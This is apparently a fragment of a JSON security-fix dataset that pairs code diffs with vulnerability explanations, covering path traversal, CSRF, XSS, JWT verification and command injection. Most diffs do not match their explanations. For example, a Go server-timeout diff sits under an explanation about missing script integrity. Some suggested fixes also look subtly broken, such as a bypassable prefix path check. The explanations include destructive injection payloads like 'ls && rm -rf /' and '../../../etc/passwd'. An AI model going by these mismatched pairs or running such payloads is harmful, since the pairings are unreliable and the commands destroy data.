\n-    except PermissionError:\n-        sg.popup(\"No Access\", font=(\"Helvetica\",13), no_titlebar=True)\n-    except FileNotFoundError:\n-        None\n-    # Strings, menus valid\n-    try:\n-        if up_string[-1] == \"/\" and up_string != \"\" and up_string != \"/\":\n-            up_string = up_string[:-1]\n-        if down_string[-1] == \"/\" and down_string != \"\" and down_string != \"/\":\n-            down_string = down_string[:-1]\n-        if path_original[-1] == \"/\" and path_original != \"\" and path_original != \"/\":\n-            path_original = path_original[:-1]\n-    except:\n-        None\n-    if down_string == \"/\" or down_string == path_original:\n-        copy = c2\n-        delete = d2\n-        rename = r2\n-        menu_def = [\"\u2261\", [hidd, revers, sort, copy, paste, delete, rename, \"\u2707 Settings\", \"\u2605 About...\"]]\n-        window[\"-MENU-\"].update(menu_definition=menu_def)\n-    elif down_string != \"/\" or down_string != path_original:\n-        copy = c1\n-        delete = d1\n-        rename = r1\n-        menu_def = [\"\u2261\", [hidd, revers, sort, copy, paste, delete, rename, \"\u2707 Settings\", \"\u2605 About...\"]]\n+import os\n+import shutil\n+import configparser\n+import PySimpleGUI as sg\n+from pathlib import Path\n+from send2trash import send2trash\n+\n+# Helper function to validate paths against base directory\n+def is_safe_path(basedir, path):\n+    # Resolve absolute paths and check prefix\n+    basedir = os.path.realpath(basedir)\n+    path = os.path.realpath(path)\n+    return path.startswith(basedir)\n+\n+# Config files.ini\n+config = configparser.ConfigParser()\n+config.read('files.ini')\n+main_path = config['USER SETTINGS'].get('home_path', '').strip()\n+if main_path == \"\":\n+    main_path = str(Path.home())\n+\n+# Ensure main_path is absolute and normalized\n+main_path = os.path.realpath(main_path)\n+\n+# Variables\n+sg.theme(\"SystemDefault1\")\n+icon = \"data/icon.png\"\n+folder_icon = \"data/icon_folder.png\"\n+file_icon = \"data/icon_file.png\"\n+home_icon = \"data/icon_home.png\"\n+up_icon = \"data/icon_up.png\"\n+treedata = sg.TreeData()\n+hidden = False\n+reverse = False\n+sort_size = False\n+size_list = []\n+count = 0\n+s = \"\u2610 Show hidden files\"\n+h = \"\u2611 Show hidden files\"\n+hidd = s\n+ab = \"\u25bc Reverse sort\"\n+ba = \"\u25b2 Reverse sort\"\n+revers = ba\n+nsort = \"\u21f5 Sort by name\"\n+ssort = \"\u21f5 Sort by size\"\n+sort = ssort\n+pd = \"\u274f Paste\"\n+pa = \"!\u274f Paste\"\n+paste = pa\n+c1 = \"\u2750 Copy\"\n+c2 = \"!\u2750 Copy\"\n+copy = c2\n+d1 = \"\u2718 Delete in trash\"\n+d2 = \"!\u2718 Delete in trash\"\n+delete = d2\n+r1 = \"\u270e Rename\"\n+r2 = \"!\u270e Rename\"\n+rename = r2\n+\n+# Convert size\n+def add_size(name):\n+    s = os.stat(name).st_size\n+    if s < 1000:\n+        size = str(s) + \" B\"\n+    if s >= 1000:\n+        size = str(round(s/1000, 2)) + \" KB\"\n+    if s >= 1000000:\n+        size = str(round(s/1000000, 2)) + \" MB\"\n+    if s >= 1000000000:\n+        size = str(round(s/1000000000, 2)) + \" GB\"\n+    if s >= 1000000000000:\n+        size = str(round(s/1000000000000, 2)) + \" TB\"\n+    return [size, s]\n+\n+# Updating files and folders\n+def add_files_in_folder(parent, dirname):\n+    # Validate dirname before listing\n+    if not is_safe_path(main_path, dirname):\n+        sg.popup(\"Access Denied: Directory traversal attempt detected\", font=(\"Helvetica\",13))\n+        return\n+    try:\n+        files = os.listdir(dirname)\n+    except Exception as e:\n+        sg.popup(f\"Error reading directory: {str(e)}\", font=(\"Helvetica\",13))\n+        return\n+\n+    if reverse == False:\n+        files.sort(key=str.lower)\n+    else:\n+        files.sort(key=str.lower, reverse=True)\n+\n+    global count\n+    global treedata\n+    treedata = sg.TreeData()\n+    for f in files:\n+        fullname = os.path.join(dirname, f)\n+        # Validate fullname path\n+        if not is_safe_path(main_path, fullname):\n+            continue\n+        if hidden == False:\n+            if f.startswith(\".\"):\n+                continue\n+            elif os.path.isdir(fullname):\n+                treedata.Insert(parent, fullname, f, values=[], icon=folder_icon)\n+                count += 1\n+            else:\n+                continue\n+        elif os.path.isdir(fullname):\n+            treedata.Insert(parent, fullname, f, values=[], icon=folder_icon)\n+            count += 1\n+        else:\n+            continue\n+    for f in files:\n+        fullname = os.path.join(dirname, f)\n+        if not is_safe_path(main_path, fullname):\n+            continue\n+        size = add_size(fullname)\n+        if sort_size == True:\n+            if hidden == False:\n+                if f.startswith(\".\"):\n+                    continue\n+                elif os.path.isdir(fullname):\n+                    continue\n+                else:\n+                    size_list_ml = [size[1], fullname, f, size[0]]\n+                    size_list.append(size_list_ml)\n+            elif os.path.isdir(fullname):\n+                continue\n+            else:\n+                size_list_ml = [size[1], fullname, f, size[0]]\n+                size_list.append(size_list_ml)\n+        else:\n+            if hidden == False:\n+                if f.startswith(\".\"):\n+                    continue\n+                elif os.path.isdir(fullname):\n+                    continue\n+                else:\n+                    treedata.Insert(parent, fullname, f, values=[size[0]], icon=file_icon)\n+                    count += 1\n+            elif os.path.isdir(fullname):\n+                continue\n+            else:\n+                treedata.Insert(parent, fullname, f, values=[size[0]], icon=file_icon)\n+                count += 1\n+    if sort_size == True:\n+        if reverse == False:\n+            size_list.sort(key=lambda size_list: size_list[0], reverse=True)\n+        else:\n+            size_list.sort(key=lambda size_list: size_list[0])\n+        for s in size_list:\n+            treedata.Insert(parent, s[1], s[2], values=[s[3]], icon=file_icon)\n+            count += 1\n+        size_list.clear()\n+\n+add_files_in_folder(\"\", main_path)\n+path_original = main_path\n+\n+# The stuff inside app\n+menu_def = [\"\u2261\", [hidd, revers, sort, copy, paste, delete, rename, \"\u2707 Settings\", \"\u2605 About...\"]]\n+layout = [  \n+    [sg.ButtonMenu(\"\u2261\", menu_def, background_color=\"white\", key=\"-MENU-\"), sg.Button(image_size=(24,24), key=\"\u2191\", image_filename=up_icon), sg.Button(image_size=(24,24), key=\"\u2302\", image_filename=home_icon), sg.Input(default_text=main_path, key=\"-OUT1-\", expand_x=True, size=(50,1))],\n+    [sg.Tree(data=treedata, font=(\"Helvetica\",15), headings=[\"size\"], auto_size_columns=False, col_widths=[10], num_rows=None, col0_width=40, max_col_width=10, row_height=30, key=\"-TREE-\", enable_events=True)],\n+    [sg.Text(text=str(count) + \" objects\", key=\"-OUT111-\", justification=\"center\", size=(20,1)), sg.Input(default_text=main_path, readonly=True, key=\"-OUT11-\", size=(40,1), expand_x=True, visible=False)] \n+]\n+\n+# Window params\n+window = sg.Window(\"Files\", layout, return_keyboard_events=True, element_justification=\"left\", debugger_enabled=False, resizable=True, margins=(0,0), finalize=True, font=(\"Helvetica\",15), icon=icon)\n+window.set_min_size((800,500))\n+window[\"-TREE-\"].expand(True, True)\n+\n+# Main loop\n+source = \"\"  # Initialize source variable for copy/paste\n+source_edit = \"\"\n+\n+while True:\n+    event, values = window.read()\n+    if event == sg.WIN_CLOSED:\n+        break\n+    up_string = values[\"-OUT1-\"]\n+    down_string = values[\"-OUT11-\"]\n+    window[\"-TREE-\"].bind(\"<Double-Button-1>\", \"double\")\n+    window[\"-TREE-\"].bind(\"<Button-1>\", \"click\")\n+\n+    # Menus events\n+    if event == \"-MENU-\":\n+        event = values[\"-MENU-\"]\n+    if event == \"\u2610 Show hidden files\":\n+        hidden = True\n+        hidd = h\n+        menu_def = [\"\u2261\", [hidd, revers, sort, copy, paste, delete, rename, \"\u2707 Settings\", \"\u2605 About...\"]]\n+        window[\"-MENU-\"].update(menu_definition=menu_def)\n+        event = \"-TREE-double\"\n+    if event == \"\u2611 Show hidden files\":\n+        hidden = False\n+        hidd = s\n+        menu_def = [\"\u2261\", [hidd, revers, sort, copy, paste, delete, rename, \"\u2707 Settings\", \"\u2605 About...\"]]\n+        window[\"-MENU-\"].update(menu_definition=menu_def)\n+        event = \"-TREE-double\"\n+    if event == \"\u25b2 Reverse sort\":\n+        reverse = True\n+        revers = ab\n+        menu_def = [\"\u2261\", [hidd, revers, sort, copy, paste, delete, rename, \"\u2707 Settings\", \"\u2605 About...\"]]\n+        window[\"-MENU-\"].update(menu_definition=menu_def)\n+        event = \"-TREE-double\"\n+    if event == \"\u25bc Reverse sort\":\n+        reverse = False\n+        revers = ba\n+        menu_def = [\"\u2261\", [hidd, revers, sort, copy, paste, delete, rename, \"\u2707 Settings\", \"\u2605 About...\"]]\n+        window[\"-MENU-\"].update(menu_definition=menu_def)\n+        event = \"-TREE-double\"\n+    if event == \"\u21f5 Sort by size\":\n+        sort_size = True\n+        sort = nsort\n+        menu_def = [\"\u2261\", [hidd, revers, sort, copy, paste, delete, rename, \"\u2707 Settings\", \"\u2605 About...\"]]\n+        window[\"-MENU-\"].update(menu_definition=menu_def)\n+        event = \"-TREE-double\"\n+    if event == \"\u21f5 Sort by name\":\n+        sort_size = False\n+        sort = ssort\n+        menu_def = [\"\u2261\", [hidd, revers, sort, copy, paste, delete, rename, \"\u2707 Settings\", \"\u2605 About...\"]]\n+        window[\"-MENU-\"].update(menu_definition=menu_def)\n+        event = \"-TREE-double\"\n+    if event == \"\u2605 About...\":\n+        sg.popup(\"Files\", \"0.5\", \"A simple file explorer\", font=(\"Helvetica\",13), icon=icon)\n+    if event == \"\u2707 Settings\":\n+        layout_set = [  \n+            [sg.Text(\"Home directory\", size=(15,1)), sg.Input(default_text=main_path, key=\"-OUT2-\", size=(60,1)), sg.Button(\"Save\")],\n+            [sg.Text(justification=\"right\", key=\"-OUT22-\", size=(60,1))] \n+        ]\n+        window_set = sg.Window(\"Settings\", layout_set, return_keyboard_events=True, element_justification=\"left\", debugger_enabled=False, modal=True, font=(\"Helvetica\",15), icon=icon)\n+        while True:\n+            event_set, values_set = window_set.read()\n+            if event_set == sg.WIN_CLOSED:\n+                break\n+            set_home_str = values_set[\"-OUT2-\"].strip()\n+            if event_set == \"Save\":\n+                # Validate new home path before saving\n+                if not os.path.isdir(set_home_str):\n+                    window_set[\"-OUT22-\"].update(\"Invalid directory path\")\n+                else:\n+                    config['USER SETTINGS']['home_path'] = set_home_str\n+                    with open('files.ini', 'w') as configfile:\n+                        config.write(configfile)\n+                    main_path = os.path.realpath(set_home_str)\n+                    window_set[\"-OUT22-\"].update(\"Settings saved\")\n+        window_set.close()\n+    # File operations\n+    if event == \"\u2750 Copy\":\n+        source = down_string\n+        source_edit = source.rsplit(\"/\", 1)\n+        paste = pd\n+        menu_def = [\"\u2261\", [hidd, revers, sort, copy, paste, delete, rename, \"\u2707 Settings\", \"\u2605 About...\"]]\n+        window[\"-MENU-\"].update(menu_definition=menu_def)\n+    if event == \"\u25a3 Paste\":\n+        if source != \"\":\n+            source_1 = os.path.join(source_edit[0], source_edit[1])\n+            if os.path.isdir(source_1):\n+                if source_edit[0] == path_original:\n+                    destination = path_original + \"/\" + source_edit[1] + \" (copy)\"\n+                else:\n+                    destination = path_original + \"/\" + source_edit[1]\n+                shutil.copytree(source, destination)\n+                source = \"\"\n+                source_edit = \"\"\n+                destination = \"\"\n+            else:\n+                if source_edit[0] == path_original:\n+                    destination = path_original + \"/\" + source_edit[1] + \" (copy)\"\n+                else:\n+                    destination = path_original + \"/\"\n+                shutil.copy2(source, destination)\n+                source = \"\"\n+                source_edit = \"\"\n+                destination = \"\"                \n+            paste = pa\n+            menu_def = [\"\u2261\", [hidd, revers, sort, copy, paste, delete, rename, \"\u2707 Settings\", \"\u2605 About...\"]]\n+            window[\"-MENU-\"].update(menu_definition=menu_def)\n+            event = \"-TREE-double\"\n+    if event == \"\u2718 Delete in trash\":\n+        del_path = down_string\n+        del_edit = del_path.rsplit(\"/\", 1)\n+        answer = sg.popup_yes_no(f\"Delete '{del_edit[1]}' in trash?\", font=(\"Helvetica\",13), no_titlebar=True)\n+        if answer == \"Yes\":\n+            if os.path.exists(del_path):\n+                send2trash(del_path)\n+                up_string = path_original\n+                down_string = path_original\n+                window[\"-OUT1-\"].update(up_string)\n+                window[\"-OUT11-\"].update(down_string)\n+                event = \"-TREE-double\"\n+    if event == \"\u270e Rename\":\n+        r_path = down_string\n+        r_edit = r_path.rsplit(\"/\", 1)\n+        if os.path.exists(r_path):\n+            save = \"not\"\n+            layout_r = [    [sg.Input(default_text=r_edit[1], key=\"-OUT3-\", size=(30,1))],\n+                            [sg.Button(\"Save\"), sg.Button(\"Cancel\")] ]\n+            window_r = sg.Window(\"Rename\", layout_r, return_keyboard_events=True, element_justification=\"center\", debugger_enabled=False, modal=True, font=(\"Helvetica\",15), no_titlebar=True)\n+            while True:\n+                event, values = window_r.read()\n+                if event == sg.WIN_CLOSED:\n+                    break\n+                rename_str = values[\"-OUT3-\"]\n+                if event == \"Save\":\n+                    save = \"ok\"\n+                    rename_str_f = r_edit[0] + \"/\" + rename_str\n+                    window_r.close()\n+                if event == \"Cancel\":\n+                    window_r.close()\n+            if save == \"ok\":\n+                os.rename(r_path, rename_str_f)\n+            event = \"-TREE-double\"\n+            up_string = path_original\n+            down_string = path_original\n+            window[\"-OUT1-\"].update(up_string)\n+            window[\"-OUT11-\"].update(down_string)\n+    # Screen with files and catalogs events\n+    if event == \"-TREE-click\":\n+        up_string = path_original\n+        down_string = path_original\n+        window[\"-OUT1-\"].update(up_string)\n+        window[\"-OUT11-\"].update(down_string)\n+    if event == \"-TREE-\":\n+        for row in values[event]:\n+            down_string = str(row)\n+            window[\"-OUT11-\"].update(down_string)\n+        for row in values[event]:\n+            up_string = str(row)\n+            path_string_e = up_string.rsplit(\"/\", 1)\n+            path_string_e1 = os.path.join(path_string_e[0], path_string_e[1])\n+            if os.path.isfile(path_string_e1):\n+                up_string = path_original\n+            window[\"-OUT1-\"].update(up_string)\n+    # Buttons events\n+    if event == \"\u2302\":\n+        up_string = main_path\n+        down_string = main_path\n+        event = \"-TREE-double\"\n+    if event == \"\u2191\":\n+        string_1 = path_original.rsplit(\"/\", 1)\n+        up_string = string_1[0]\n+        down_string = up_string\n+        if up_string == \"\":\n+            up_string = up_string + \"/\"\n+            down_string = up_string\n+        event = \"-TREE-double\"\n+    # Refresh layout\n+    try:\n+        if event == \"-TREE-double\" or event == \"KP_Enter:104\" or event == \"Return:36\":\n+            count = 0\n+            add_files_in_folder(\"\", up_string)\n+            path_original = up_string\n+            window[\"-TREE-\"].update(values=treedata)\n+            window[\"-OUT1-\"].update(up_string)\n+            window[\"-OUT11-\"].update(down_string)\n+            window[\"-OUT111-\"].update(str(count) + \" objects\")          \n+    except PermissionError:\n+        sg.popup(\"No Access\", font=(\"Helvetica\",13), no_titlebar=True)\n+    except FileNotFoundError:\n+        None\n+    # Strings, menus valid\n+    try:\n+        if up_string[-1] == \"/\" and up_string != \"\" and up_string != \"/\":\n+            up_string = up_string[:-1]\n+        if down_string[-1] == \"/\" and down_string != \"\" and down_string != \"/\":\n+            down_string = down_string[:-1]\n+        if path_original[-1] == \"/\" and path_original != \"\" and path_original != \"/\":\n+            path_original = path_original[:-1]\n+    except:\n+        None\n+    if down_string == \"/\" or down_string == path_original:\n+        copy = c2\n+        delete = d2\n+        rename = r2\n+        menu_def = [\"\u2261\", [hidd, revers, sort, copy, paste, delete, rename, \"\u2707 Settings\", \"\u2605 About...\"]]\n+        window[\"-MENU-\"].update(menu_definition=menu_def)\n+    elif down_string != \"/\" or down_string != path_original:\n+        copy = c1\n+        delete = d1\n+        rename = r1\n+        menu_def = [\"\u2261\", [hidd, revers, sort, copy, paste, delete, rename, \"\u2707 Settings\", \"\u2605 About...\"]]\n         window[\"-MENU-\"].update(menu_definition=menu_def)\n\n",
        "explanation": "Explanation:\nThe application allows adding custom folders with user-defined extensions. There is no validation of extensions or file types, which could allow dangerous file types (e.g., executable scripts) to be moved into user-accessible folders.\n\n\nPOC:\nA user adds a custom folder with extensions like .exe or .py and moves such files, possibly enabling execution of malicious code if accessed.\n\n\nRoot Cause: \nFile https://github.com/Celestial-0/FILE-MANAGER/blob/main/project.py\nLines 64: on_add_custom_click method accepts arbitrary folder names and extensions without validation.\n\n\nExploit Scenario:\nMalicious files get organized into accessible folders, potentially leading to execution or distribution of malware.\n\n\nWhy it Happens:\nLack of validation or whitelisting of allowed file extensions.\n\n\nSecurity Implications:\nExecution of malicious files, spreading malware. An attacker could upload malicious files to shared directories or directories of executables possibly leading to arbitrary command execution.\n\n\nSuggested Fix with suggested code:\nImplement a whitelist of allowed extensions or sanitize inputs:\n\nPatch:\n\nALLOWED_EXTENSIONS = {'mp3', 'jpg', 'png', 'docx', 'mp4', ...}\n\nfolder_exts = [ext.strip().lower() for ext in self.custom_exts_input.value.split(',')]\nif not all(ext in ALLOWED_EXTENSIONS for ext in folder_exts):\n    self.show_error_dialog(\"One or more file extensions are not allowed.\")\n    return"
    },
    "126": {
        "diff": "--- main.go\n+++ main.go\n@@\n import (\n \t\"log\"\n \t\"net/http\"\n+\t\"time\"\n \n \t\"github.com/gorilla/mux\"\n \n \t\"github.com/SAP-samples/kyma-runtime-extension-samples/saas-provisioning/internal/api\"\n \n \tappconfig \"github.com/SAP-samples/kyma-runtime-extension-samples/saas-provisioning/internal/config\"\n )\n \n func main() {\n \n \trouter := mux.NewRouter().StrictSlash(true)\n \n \trouter.HandleFunc(\"/callback/v1.0/tenants/{tenant}\", api.Provision).Methods(\"PUT\")\n \trouter.HandleFunc(\"/callback/v1.0/tenants/{tenant}\", api.Deprovision).Methods(\"DELETE\")\n \n \t_ = appconfig.GetConfig()\n \n-\tlog.Fatal(http.ListenAndServe(\":8000\", router))\n+\tsrv := &http.Server{\n+\t\tAddr:              \":8000\",\n+\t\tHandler:           router,\n+\t\tReadHeaderTimeout: 5 * time.Second,\n+\t}\n+\tlog.Fatal(srv.ListenAndServe())\n }\n",
        "explanation": "Vulnerability Type:\nCWE-353: Missing Support for Integrity Check\n\nProof of Concept:\nIn the original HTML:\n\n<script src=\"http://cdn.leafletjs.com/leaflet-0.7.2/leaflet.js\"></script>\nThere is no integrity attribute.\nThus, if the remote file is compromised (man-in-the-middle attack, CDN breach, etc.), the browser will execute it without any verification.\n\nSeverity:\nLOW\n\nRoot Cause:\nThe web page includes external JavaScript and CSS files without specifying an integrity attribute.\nWithout an integrity check, browsers have no way to validate that the downloaded resource is unmodified and trustworthy.\n\nExploit Scenario:\nAn attacker compromises the Leaflet CDN and injects malicious JavaScript into the hosted leaflet.js file.\nWhen a user loads the page, the malicious script executes automatically in their browser \u2014 leading to data theft, account takeover, or malware distribution.\n\nWhy It Happens:\nThe developer failed to add integrity and crossorigin attributes when referencing third-party scripts or styles.\nWithout integrity metadata, browsers blindly trust all loaded external resources, even if they have been tampered with.\n\nSecurity Implications:\nIf exploited:\n\nUsers can be exposed to malicious scripts.\n\nCross-site scripting (XSS), session hijacking, data exfiltration.\n\nLarge-scale supply-chain attacks become possible if CDNs are targeted.\n\nSuggested Fix:\nAdd an integrity attribute with the SHA384 hash of the resource and a crossorigin=\"anonymous\" attribute to all <script> and <link> tags referencing external resources:\n\n<script src=\"https://cdn.example.com/file.js\" integrity=\"sha384-abc123...\" crossorigin=\"anonymous\"></script>\nBrowsers will verify the hash before executing the resource, ensuring tampering is detected and blocked automatically."
    },
    "145": {
        "diff": "--- a/server.js\n+++ b/server.js\n@@ const express = require(\"express\");\n+const cookieParser = require(\"cookie-parser\");\n+const csrf = require(\"csurf\");\n\n@@ (async () => {\n   await fs.remove(workingDir);\n   await createWorkingDirectories();\n   const app = express();\n+\n+  // Enable cookie parser and CSRF protection\n+  app.use(cookieParser());\n+  const csrfProtection = csrf({ cookie: true });\n\n   app.use(fileupload());\n   app.use(express.urlencoded({ extended: false }));\n\n@@\n   app.get(\"/\", (req, res) => {\n     res.send(index);\n   });\n\n+  app.get(\"/form\", csrfProtection, (req, res) => {\n+    res.send(`<form action=\"/convert\" method=\"POST\" enctype=\"multipart/form-data\">\n+                <input type=\"hidden\" name=\"_csrf\" value=\"${req.csrfToken()}\">\n+                <input type=\"file\" name=\"h5p_file\" />\n+                <input type=\"submit\" value=\"Upload\" />\n+              </form>`);\n+  });\n\n-  app.post(\"/convert\", async function(req, res) {\n+  app.post(\"/convert\", csrfProtection, async function(req, res) {\n",
        "explanation": "Vulnerable Code:\ndef get_pdf_text(pdf_docs):\n    text = \"\"\n    for pdf in pdf_docs:\n        pdf_reader = PdfReader(pdf)  # No validation\n        for page in pdf_reader.pages:\n            text += page.extract_text()\n\nRoot Cause Analysis:\n\nThe get_pdf_text() function processes PDFs without:\n1.File type verification\n2.Size limitations\n3.Content sanitization\nPyPDF2 doesn't disable dangerous features by default.\n\nExploit Scenarios:\nArbitrary code execution via embedded JavaScript\nDenial of Service through decompression bombs\nPath traversal if filenames contain ../\n\nSecurity Implications:\n1.Remote Code Execution\n2. Denial of Service\n3. Data Exfiltration\n\nSuggested Fix:\n\nfrom fpdf import FPDF\nimport tempfile\n\ndef safe_extract_text(pdf_file):\n    MAX_SIZE = 10 * 1024 * 1024  # 10MB\n    if len(pdf_file.read()) > MAX_SIZE:\n        raise ValueError(\"File too large\")\n    pdf_file.seek(0)\n    \n    if not pdf_file.read(4) == b'%PDF':\n        raise ValueError(\"Invalid PDF\")\n    pdf_file.seek(0)\n    \n    with tempfile.NamedTemporaryFile() as tmp:\n        tmp.write(pdf_file.read())\n        reader = PdfReader(tmp.name)\n        return \"\".join(page.extract_text() for page in reader.pages)"
    },
    "142": {
        "diff": "@app.route('/data', methods=['GET', 'POST'])\ndef upload_file():\n    # Ensure the user is authenticated\n    if 'role' not in session or session['role'] not in ['admin', 'user']:\n        flash('Unauthorized access')\n        return redirect('/signin')\n\n    tools.empty_folder('uploads')\n    if request.method == 'POST':\n        # Check if the post request has the file part\n        if 'file' not in request.files:\n            flash('No file part')\n            return redirect(request.url)\n        \n        file = request.files['file']\n        \n        # Validate the filename\n        if file.filename == '':\n            flash('No selected file')\n            return 'NO FILE SELECTED'\n\n        if file and allowed_file(file.filename):\n            try:\n                # Save file securely\n                filename = secure_filename(file.filename)\n                file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))\n                \n                # Log upload details for auditing\n                with open('raw_data/meta_data.txt', 'a') as meta_file:\n                    meta_file.write(filename + '\\n')\n                \n                # Encrypt the file after upload\n                return start_encryption()\n\n            except Exception as e:\n                flash(f\"File upload failed: {str(e)}\")\n                return 'File upload failed'\n        else:\n            flash('Invalid file type')\n            return 'Invalid File Format!'\n    \n    return 'Invalid Request!'",
        "explanation": "Vulnerability Type:\nCWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\n[line: 178,182,183,191,197]\nProof of Concept (Elaborated):\nVulnerable Code:\nos.remove(new_base + \".original\")\nos.link(old_base + \".original\", new_base + \".original\")\nwith open(old_base + \".original\", \"rb\") as f:\nwith open(new_base + \".png\", \"wb\") as f:\n\nStep-by-Step Explanation:\n1.\tProblem:\no\told_base and new_base are constructed using user data (user.realm_id, user.id, and settings.LOCAL_AVATARS_DIR).\no\tNo strict validation is performed to ensure that these paths stay within the intended LOCAL_AVATARS_DIR.\no\tos.remove, os.link, and open() are called directly on these paths.\n2.\tHow to Attack:\no\tAn attacker can manipulate user.realm_id or related values to inject traversal sequences like:\no\t../../../etc/passwd\no\tIf injected successfully, the server might:\n\uf0a7\tDelete critical system files (/etc/passwd)\n\uf0a7\tOverwrite or create unauthorized files\n\uf0a7\tCause Denial of Service (DoS)\n\nExample Exploit:\nSuppose user.realm_id is set to:\n../../../etc\nThen old_base becomes:\n/your/app/path/../../../etc/<hash>.original\nWhich resolves to:\n/etc/<hash>.original\nResult:\n\u2022\tCritical system files under /etc/ could be read, modified, or deleted.\n\nSeverity:\nCritical (Full Filesystem Compromise)\n\nRoot Cause:\nThe application blindly trusts user-derived data to construct file paths, and then performs filesystem operations without validating or restricting the final paths.\n\nExploit Scenario:\nAn attacker registers or modifies a user account with crafted realm_id or related fields containing directory traversal payloads.\nUpon avatar processing, the server accidentally reads/writes/deletes files outside the safe avatar storage directory.\n\nWhy It Happens:\nBecause dynamic user input is directly included in the file system path construction without using a secure validation method like os.path.realpath() checking against a base directory.\n\nSecurity Implications:\nIf exploited:\n\u2022\tAttacker can read sensitive files (credentials, configs).\n\u2022\tOverwrite important application files.\n\u2022\tDelete critical files, causing server outages.\n\u2022\tElevate privileges or gain unauthorized access.\n\nSuggested Fix:\n--- 0544_copy_avatar_images.py\t2025-04-27\n+++ 0544_copy_avatar_images_fixed.py\t2025-04-27\n@@\n- old_base = os.path.join(settings.LOCAL_AVATARS_DIR, str(user.realm_id), old_hash(user))\n- new_base = os.path.join(settings.LOCAL_AVATARS_DIR, str(user.realm_id), new_hash(user))\n+ old_base = os.path.realpath(os.path.join(settings.LOCAL_AVATARS_DIR, str(user.realm_id), old_hash(user)))\n+ new_base = os.path.realpath(os.path.join(settings.LOCAL_AVATARS_DIR, str(user.realm_id), new_hash(user)))\n+\n+ if not old_base.startswith(os.path.realpath(settings.LOCAL_AVATARS_DIR)) or not new_base.startswith(os.path.realpath(settings.LOCAL_AVATARS_DIR)):\n+     raise ValueError(\"Invalid file path detected\")\n"
    },
    "118": {
        "diff": "--- workorder.js\t2025-04-27\n+++ workorder_fixed.js\t2025-04-27\n@@\n- $('#autoSuggestionsList').html(data);\n+ $('#autoSuggestionsList').html(DOMPurify.sanitize(data));\n",
        "explanation": "Explanation:\nThe code allows user input (e.g., main_path, up_string, down_string) to be used directly in file system operations such as listing directories (os.listdir), copying files (shutil.copytree, shutil.copy2), deleting files (send2trash), and renaming files (os.rename) without any validation or sanitization of the path. This enables an attacker to supply crafted paths to access or manipulate arbitrary files outside the intended directory scope.\n\n\nPOC:\nIf an attacker can control the input for main_path or the paths used in copy/paste/delete/rename operations, they could specify a path like /etc/passwd or ../../../../etc/passwd to read or manipulate sensitive system files.\n\n\nRoot Cause: \nFile: https://github.com/lestec-al/files/blob/main/files_old.py\n\nLine 11: main_path = config['USER SETTINGS']['home_path'] - no validation on config input.\nLines 32, 33: files = os.listdir(dirname) and subsequent use of dirname from user input.\nLines 139-158: Copy and paste operations use source and destination derived from user input without validation.\nLines 160-171: Delete operation uses del_path from user input without validation.\nLines 172-193: Rename operation uses r_path from user input without validation.\n\n\nExploit Scenario:\nAn attacker modifies the files.ini configuration or manipulates the GUI input fields to specify paths outside the intended directory, enabling reading, copying, deleting, or renaming arbitrary files on the system.\n\n\nWhy it Happens:\nLack of input validation and sanitization on file paths allows directory traversal attacks.\n\n\n\nSecurity Implications:\nUnauthorized access to sensitive files.\nPotential data leakage or corruption.\nArbitrary file deletion or overwriting critical system files.\nEscalation to remote code execution if combined with other vulnerabilities.\n\n\nSuggested Fix:\nValidate and sanitize all file paths to ensure they are within an allowed base directory.\nUse os.path.realpath() and verify the resolved path starts with the intended base directory.\nReject or sanitize any paths that attempt to traverse outside the allowed directory.\n\nPatch fix snippet for path validation:\n\ndef is_safe_path(basedir, path):\n    # Resolve absolute paths and check prefix\n    return os.path.realpath(path).startswith(os.path.realpath(basedir))\n\n# Example usage before any file operation:\nif not is_safe_path(main_path, user_supplied_path):\n    raise ValueError(\"Invalid path detected: directory traversal attempt\")\n\nApply this check before any file operation involving user input paths."
    },
    "127": {
        "diff": "@@ def _get_session(self, scope=None):\n-        decoded_token = jwt.decode(self._active_session.access_token_response.json()['access_token'],\n-                                   options={'verify_signature': False})\n+        decoded_token = jwt.decode(\n+            self._active_session.access_token_response.json()['access_token'],\n+            options={'verify_signature': True},\n+            algorithms=['RS256'],  # specify algorithms\n+            verify=True\n+        )\n\n@@ def _resolve_configured_scopes(self):\n-        decoded_token = jwt.decode(encoded_token, options={'verify_signature': False})\n+        decoded_token = jwt.decode(\n+            encoded_token,\n+            options={'verify_signature': True},\n+            algorithms=['RS256'],\n+            verify=True\n+        )\n",
        "explanation": "Vulnerability Type:\nCWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\n\nProof of Concept:\nIn the original code:\n\nexec(cmd, (err, stdout, stderr) => {...})\nif cmd is user-controlled and not sanitized, an attacker can inject shell metacharacters (&&, ;, |) to execute arbitrary commands.\n\nExample:\n\n\ncmder(\"ls && rm -rf /\")\ncould lead to catastrophic system damage.\n\nSeverity:\nHIGH\n\nRoot Cause:\nThe code uses child_process.exec() directly with concatenated or dynamic command strings.\nSince exec() invokes a shell, any unsanitized input is interpreted as shell commands, creating opportunities for command injection attacks.\n\nExploit Scenario:\nAn attacker tricks the server by injecting payloads like:\n\n\necho safe_input && rm -rf /\nThis executes additional malicious commands after a legitimate one.\nIt can lead to file deletions, data breaches, or full server compromise.\n\nWhy It Happens:\nThe vulnerability happens because exec() parses its input string via the shell.\nWithout strict input validation, anything injected into the command string will be executed as part of the shell instructions.\n\nSecurity Implications:\nSuccessful exploitation allows attackers to:\n\nExecute arbitrary OS commands.\n\nDelete or modify server files.\n\nAccess sensitive environment variables.\n\nEscalate privileges on the server.\n\nFully compromise the application and infrastructure.\n\nSuggested Fix:\nUse child_process.spawn() instead of exec().\nspawn():\n\nPasses command and arguments separately.\n\nDoes not invoke a shell (unless explicitly specified).\n\nPrevents interpretation of injected shell metacharacters.\n\nExample:\n\n\nconst { spawn } = require('child_process');\nconst child = spawn('echo', ['HelloWorld']);\nAlways separate the executable and its parameters to eliminate injection risks."
    },
    "120": {
